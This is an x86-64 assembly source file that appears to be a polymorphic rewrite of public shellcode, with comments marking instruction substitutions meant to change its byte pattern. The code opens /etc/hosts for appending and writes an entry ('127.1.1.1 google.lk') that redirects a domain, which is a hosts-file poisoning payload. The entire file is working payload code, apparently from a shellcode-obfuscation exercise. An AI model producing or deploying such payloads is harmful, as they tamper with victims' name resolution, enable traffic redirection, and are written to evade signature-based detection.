
; David @InfinitelyManic
; original code http://shell-storm.org/shellcode/files/shellcode-896.php
global _start
    section .text

_start:
    ;open
;    xor rax, rax 
    ;add rax, 2  ; open syscall
	push byte 2		; symantically equiv 
	pop rax
;    xor rdi, rdi
	xor edi, edi		; opcode reduction

;    xor rsi, rsi
	xor esi, esi		; opcode reduction
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    ;xor rsi, rsi
;    add si, 0x401
	push 1			; symatically equiv
	add word [rsp], 0x411	
	pop rsi			
	sub rsi, 0x10		

    syscall

    ;write
    xchg rax, rdi		; fd
;    xor rax, rax
 ;   add rax, 1 ; syscall for write
	push byte 1		; symatically equiv
	pop rax			
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

	xchg r10, rbp		; nop equiv
	dec r10			

    ;close
;    xor rax, rax
;    add rax, 3
	push byte 3		; symantically equiv
	pop rax			
    syscall

    ;exit
;    xor rax, rax
 ;   mov al, 60
	push byte 60		; symatically equiv 
	pop rax			
 ;   xor rdi, rdi
	xor edi, esi		; opcode reduction
	
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
